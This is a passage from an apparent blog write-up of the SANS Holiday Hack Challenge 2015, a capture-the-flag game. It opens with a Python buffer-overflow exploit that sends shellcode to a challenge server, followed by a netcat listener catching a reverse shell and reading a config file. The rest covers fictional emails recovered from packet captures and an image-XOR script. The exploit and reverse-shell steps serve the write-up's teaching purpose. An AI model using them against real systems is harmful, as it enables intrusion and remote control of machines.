    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x6b\x93\x04\x08&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;
    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="c"&gt;# padding to get a length of 200 bytes&lt;/span&gt;

    &lt;span class="c"&gt;# We connect to our distant server&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;settimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;54.233.105.81&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4242&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="c"&gt;# We receive all the data we can&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;pass&lt;/span&gt;

    &lt;span class="c"&gt;# We enter the secret command&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;X&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c"&gt;# We receive all the data we can&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;pass&lt;/span&gt;

    &lt;span class="c"&gt;# We send our payload&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We launch our exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./exploit_sg05.py
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And in another terminal, on the server I own:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;nc -lvp 8080
listening on &lt;span class="o"&gt;[&lt;/span&gt;any&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;8080&lt;/span&gt; ...
connect to &lt;span class="o"&gt;[&lt;/span&gt;192.168.XX.XX&lt;span class="o"&gt;]&lt;/span&gt; from ec2-54-233-105-81.sa-east-1.compute.amazonaws.com &lt;span class="o"&gt;[&lt;/span&gt;54.233.105.81&lt;span class="o"&gt;]&lt;/span&gt; 42021
cat /gnome/www/files/gnome.conf
Gnome Serial Number: 4CKL3R43V4
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-05
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The flag for this SuperGnome is &lt;code&gt;4CKL3R43V4&lt;/code&gt;
(&lt;a class="reference external" href="http://www.sou.edu/cs/lynnackler.html"&gt;geeky reference&lt;/a&gt;).&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="part-5-baby-its-gnome-outside-sinister-plot-and-attribution"&gt;
&lt;h2&gt;Part 5: Baby, Itâ€™s Gnome Outside: &lt;em&gt;Sinister Plot and Attribution&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;We can see on the SuperGnomes some capture files, inside ZIP archives. We can
also see from a conversation on the GnomeNET on the SuperGnomes that someone
has a problem with the pictures taken by the gnomes: if some gnomes have the
same name, the uploaded images get scrambled together (the RGB pixels are
XORed with one another):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to GnomeNET.&lt;/p&gt;
&lt;p&gt;I noticed an issue when there are multiple child-gnomes with the same name.
The image feeds become scrambled together. Any way to resolve this other
than rename the gnomes?? ~DW&lt;/p&gt;
&lt;p&gt;Can you provide an example of the scrambling you're seeing? ~PS&lt;/p&gt;
&lt;p&gt;I uploaded 'camera_feed_overlap_error.png' to SG-01. We have six factory
test cameras all named the same. The issue occurs only when they have the
same name. It occurs even if the cameras are not transmitting an image. ~PS&lt;/p&gt;
&lt;p&gt;Oh, also, in the image, 5 of the cameras are just transmitting the 'camera
disabled' static, the 6th one was in the boss' office. The door was locked
and the boss seemed busy, so I didn't mess with that one. ~PS&lt;/p&gt;
&lt;p&gt;To help me troubleshoot this, can you grab a still from all six cameras at
the same time? Also, is this really an issue? ~DW&lt;/p&gt;
&lt;p&gt;I grabbed a still from 5 of the 6 cameras, again, staying out of the boss'
office! Each cam is directed to a different SG, so each SG has one of the
5 stills I manually snagged. I named them 'factory_cam_#.png' and pushed
them up to the files menu. 'camera_feed_overlap_error.png' has that garbled
image. Oh, and to answer your question. Yes. We have almost 2 million
cameras... some of them WILL be named the same. Just fix it. ~PS&lt;/p&gt;
&lt;p&gt;Took a look at your issue. It looks like the camera feed collector only
cares about the name and will merge the feeds. Looks like each pixel is
XORed... Its going to be a lot of work to fix this. We are too late in
the game to push a new update to all the cameras... stop naming cameras
the same name. ~DW&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So we have six images: five from some gnomes and one from the boss' office.
By recovering the five images and XORing them with the sixth image, we can
see an image from the boss' office!&lt;/p&gt;
&lt;p&gt;By using the vulnerabilities from Part 4, we can recover the capture file
and the images.&lt;/p&gt;
&lt;p&gt;You can download the capture files here:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20141226101055_1.pcap"&gt;First capture file&lt;/a&gt;
(sha256: &lt;code&gt;a15a537562a4c828bf9eebd09f8f99686df76a4854a741a2df63902a023a1cea&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20150225093040_2.pcap"&gt;Second capture file&lt;/a&gt;
(sha256: &lt;code&gt;d4481450877d1468fba6c038f2a2c7b72eaab80540dda07fcc28b0a63045bd0c&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20151201113358_3.pcap"&gt;Third capture file&lt;/a&gt;
(sha256: &lt;code&gt;f12950e677cfa1646c1c616a62d063497cf0d2cc9cea3a0167ad302a02b682c8&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20151203133818_4.pcap"&gt;Fourth capture file&lt;/a&gt;
(sha256: &lt;code&gt;45f076467bdd69d4855d21726f398f246b7179e499fde663b4f6c7e77ba39025&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20151215161015_5.pcap"&gt;Fifth capture file&lt;/a&gt;
(sha256: &lt;code&gt;5a637e03e9a2ea4b4fde5437eabd281d2e78c6b383a31f0e705dd9da2ec6c12a&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can download the images here:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_1.png"&gt;First factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_2.png"&gt;Second factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_3.png"&gt;Third factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_4.png"&gt;Fourth factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_5.png"&gt;Fifth factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/camera_feed_overlap_error.png"&gt;Camera overlay image&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let's look at the capture files first. By opening them with Wireshark,
we can see some SMTP and IMAP traffic.By using the wonderful
&amp;quot;Follow TCP Stream&amp;quot; functionnality, we can recover the full traffic.&lt;/p&gt;
&lt;div class="section" id="first-capture-file"&gt;
&lt;h3&gt;First capture file&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;c&amp;quot; &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
To: &amp;lt;jojo&amp;#64;atnascorp.com&amp;gt;
Subject: GiYH Architecture
Date: Fri, 26 Dec 2014 10:10:55 -0500

JoJo,

As you know, I hired you because you are the best architect in town for a
distributed surveillance system to satisfy our rather unique business
requirements.  We have less than a year from today to get our final plans in
place.  Our schedule is aggressive, but realistic.

I've sketched out the overall Gnome in Your Home architecture in the diagram
attached below.  Please add in protocol details and other technical
specifications to complete the architectural plans.

Remember: to achieve our goal, we must have the infrastructure scale to
upwards of 2 million Gnomes.  Once we solidify the architecture, you'll work
with the hardware team to create device specs and we'll start procuring
hardware in the February 2015 timeframe.

I've also made significant progress on distribution deals with retailers.

Thoughts?

Looking forward to working with you on this project!

-C
&lt;/pre&gt;
&lt;p&gt;Attached to this email is this image:&lt;/p&gt;
&lt;img alt="giyh_architecture.jpg" class="align-center" src="/images/sans-christmas-challenge-2015/giyh_architecture.jpg" /&gt;
&lt;/div&gt;
&lt;div class="section" id="second-capture-file"&gt;
&lt;h3&gt;Second capture file&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;c&amp;quot; &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
To: &amp;lt;supplier&amp;#64;ginormouselectronicssupplier.com&amp;gt;
Subject: Large Order - Immediate Attention Required
Date: Wed, 25 Feb 2015 09:30:39 -0500

Maratha,

As a follow-up to our phone conversation, we'd like to proceed with an order
of parts for our upcoming product line.  We'll need two million of each of
the following components:

* Ambarella S2Lm IP Camera Processor System-on-Chip (with an ARM Cortex A9
  CPU and Linux SDK)
* ON Semiconductor AR0330: 3 MP 1/3&amp;quot; CMOS Digital Image Sensor
* Atheros AR6233X Wi-Fi adapter
* Texas Instruments TPS65053 switching power supply
* Samsung K4B2G16460 2GB SSDR3 SDRAM
* Samsung K9F1G08U0D 1GB NAND Flash

Given the volume of this purchase, we fully expect the 35% discount you
mentioned during our phone discussion.  If you cannot agree to this pricing,
we'll place our order elsewhere.

We need delivery of components to begin no later than April 1, 2015, with
250,000 units coming each week, with all of them arriving no later than June
1, 2015.


Finally, as you know, this project requires the utmost secrecy.   Tell NO
ONE about our order, especially any nosy law enforcement authorities.

Regards,

-CW
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="third-capture-file"&gt;
&lt;h3&gt;Third capture file&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;c&amp;quot; &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
To: &amp;lt;burglerlackeys&amp;#64;atnascorp.com&amp;gt;
Subject: All Systems Go for Dec 24, 2015
Date: Tue, 1 Dec 2015 11:33:56 -0500

My Burgling Friends,

Our long-running plan is nearly complete, and I'm writing to share the date
when your thieving will commence!  On the morning of December 24, 2015, each
individual burglar on this email list will receive a detailed itinerary of
specific houses and an inventory of items to steal from each house, along
with still photos of where to locate each item.  The message will also
include a specific path optimized for you to hit your assigned houses
quickly and efficiently the night of December 24, 2015 after dark.

Further, we've selected the items to steal based on a detailed analysis of
what commands the highest prices on the hot-items open market.  I caution
you - steal only the items included on the list.  DO NOT waste time grabbing
anything else from a house.  There's no sense whatsoever grabbing crumbs too
small for a mouse!

As to the details of the plan, remember to wear the Santa suit we provided
you, and bring the extra large bag for all your stolen goods.

If any children observe you in their houses that night, remember to tell
them that you are actually &amp;quot;Santy Claus&amp;quot;, and that you need to send the
specific items you are taking to your workshop for repair.  Describe it in a
very friendly manner, get the child a drink of water, pat him or her on the
head, and send the little moppet back to bed.  Then, finish the deed, and
get out of there.  It's all quite simple - go to each house, grab the loot,
and return it to the designated drop-off area so we can resell it.  And,
above all, avoid Mount Crumpit!

As we agreed, we'll split the proceeds from our sale 50-50 with each
burglar.

Oh, and I've heard that many of you are asking where the name ATNAS comes
from.  Why, it's reverse SANTA, of course.  Instead of bringing presents on
Christmas, we'll be stealing them!

Thank you for your partnership in this endeavor.

Signed:

-CLW

President and CEO of ATNAS Corporation
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="fourth-capture-file"&gt;
&lt;h3&gt;Fourth capture file&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;c&amp;quot; &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
To: &amp;lt;psychdoctor&amp;#64;whovillepsychiatrists.com&amp;gt;
Subject: Answer To Your Question
Date: Thu, 3 Dec 2015 13:38:15 -0500

Dr. O'Malley,

In your recent email, you inquired:

&amp;gt; When did you first notice your anxiety about the holiday season?

Anxiety is hardly the word for it.  It's a deep-seated hatred, Doctor.

Before I get into details, please allow me to remind you that we operate
under the strictest doctor-patient confidentiality agreement in the
business.  I have some very powerful lawyers whom I'd hate to invoke in the
event of some leak on your part.  I seek your help because you are the best
psychiatrist in all of Who-ville.

To answer your question directly, as a young child (I must have been no more
than two), I experienced a life-changing interaction.  Very late on
Christmas Eve, I was awakened to find a grotesque green Who dressed in a
tattered Santa Claus outfit, standing in my barren living room, attempting
to shove our holiday tree up the chimney.  My senses heightened, I put on my
best little-girl innocent voice and asked him what he was doing.  He
explained that he was &amp;quot;Santy Claus&amp;quot; and needed to send the tree for repair.
I instantly knew it was a lie, but I humored the old thief so I could escape
to the safety of my bed.  That horrifying interaction ruined Christmas for
me that year, and I was terrified of the whole holiday season throughout my
teen years.

I later learned that the green Who was known as &amp;quot;the Grinch&amp;quot; and had lost
his mind in the middle of a crime spree to steal Christmas presents.  At the
very moment of his criminal triumph, he had a pitiful change of heart and
started playing all nicey-nice.  What an amateur!  When I became an adult,
my fear of Christmas boiled into true hatred of the whole holiday season.  I
knew that I had to stop Christmas from coming.  But how?

I vowed to finish what the Grinch had started, but to do it at a far larger
scale.  Using the latest technology and a distributed channel of burglars,
we'd rob 2 million houses, grabbing their most precious gifts, and selling
them on the open market.  We'll destroy Christmas as two million homes full
of people all cry &amp;quot;BOO-HOO&amp;quot;, and we'll turn a handy profit on the whole
deal.

Is this &amp;quot;wrong&amp;quot;?  I simply don't care.  I bear the bitter scars of the
Grinch's malfeasance, and singing a little &amp;quot;Fahoo Fores&amp;quot; isn't gonna fix
that!

What is your advice, doctor?

Signed,

Cindy Lou Who
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="fifth-capture-file"&gt;
&lt;h3&gt;Fifth capture file&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;Grinch&amp;quot; &amp;lt;grinch&amp;#64;who-villeisp.com&amp;gt;
To: &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
Subject: My Apologies &amp;amp; Holiday Greetings
Date: Tue, 15 Dec 2015 16:09:40 -0500

Dear Cindy Lou,

I am writing to apologize for what I did to you so long ago.  I wronged you
and all the Whos down in Who-ville due to my extreme misunderstanding of
Christmas and a deep-seated hatred.  I should have never lied to you, and I
should have never stolen those gifts on Christmas Eve.  I realize that even
returning them on Christmas morn didn't erase my crimes completely.  I seek
your forgiveness.

You see, on Mount Crumpit that fateful Christmas morning, I learned th[4 bytes missing in capture file]at
Christmas doesn't come from a store.  In fact, I discovered that Christmas
means a whole lot more!

When I returned their gifts, the Whos embraced me.  They forgave.  I was
stunned, and my heart grew even more.  Why, they even let me carve the roast
beast!  They demonstrated to me that the holiday season is, in part, about
forgiveness and love, and that's the gift that all the Whos gave to me that
morning so long ago.  I honestly tear up thinking about it.

I don't expect you to forgive me, Cindy Lou.  But, you have my deepest and
most sincere apologies.

And, above all, don't let my horrible actions from so long ago taint you in
any way.  I understand you've grown into an amazing business leader.  You
are a precious and beautiful Who, my dear.  Please use your skills wisely
and to help and support your fellow Who, especially during the holidays.

I sincerely wish you a holiday season full of kindness and warmth,

--The Grinch
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="let-s-unxor-the-images"&gt;
&lt;h3&gt;Let's unXOR the images&lt;/h3&gt;
&lt;p&gt;With a simple Python script, we can take every image and XOR the RGB pixels
to recover the image from the boss' office:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;PIL&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="c"&gt;# We open the camera feed overlap image&lt;/span&gt;
    &lt;span class="n"&gt;scrambled_image&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;convert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;RGB&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;scrambled_image_pixels&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;scrambled_image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;load&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;height&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;scrambled_image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;

    &lt;span class="c"&gt;# For every image found in one of the SuperGnomes&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
        &lt;span class="n"&gt;image_pixels&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;convert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;RGB&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;load&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;height&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="c"&gt;# We take the RGB components&lt;/span&gt;
                &lt;span class="n"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;g1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;scrambled_image_pixels&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;g2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;image_pixels&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="c"&gt;# And we XOR them to recover the original value&lt;/span&gt;
                &lt;span class="n"&gt;scrambled_image_pixels&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r1&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;g1&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;g2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b1&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;b2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c"&gt;# We save the result in a new image&lt;/span&gt;
    &lt;span class="n"&gt;scrambled_image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;result.png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;PNG&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then, we just have to run this script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./unxor_images.py sg01/factory_cam_1.png sg02/factory_cam_2.png sg03/factory_cam_3.png &lt;span class="se"&gt;\&lt;/span&gt;
    sg04/factory_cam_4.png sg05/factory_cam_5.png camera_feed_overlap_error.png
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This gives us the resulting image:&lt;/p&gt;
&lt;img alt="sans_xor_image_result.png" class="align-center" src="/images/sans-christmas-challenge-2015/sans_xor_image_result.png" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="epilogue-twas-the-gnome-before-christmas-wrapping-it-all-up"&gt;
&lt;h2&gt;Epilogue: â€˜Twas the Gnome Before Christmas: &lt;em&gt;Wrapping It All Up&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;As in every SANS Christmas Challenge, we have to answer several
questions:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Which commands are sent across the Gnomeâ€™s command-and-control
channel?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The command sent to the command-and-control server are &lt;code&gt;iwconfig&lt;/code&gt; and
&lt;code&gt;cat /tmp/iwlistscan.txt&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="2"&gt;
&lt;li&gt;What image appears in the photo the Gnome sent across the
channel from the Dosis home?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We can see a picture of Josh's bedroom.&lt;/p&gt;
&lt;ol class="arabic simple" start="3"&gt;
&lt;li&gt;What operating system and CPU type are used in the Gnome?
What type of web framework is the Gnome web interface built in?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The Gnome is running OpenWRT in the development branch.
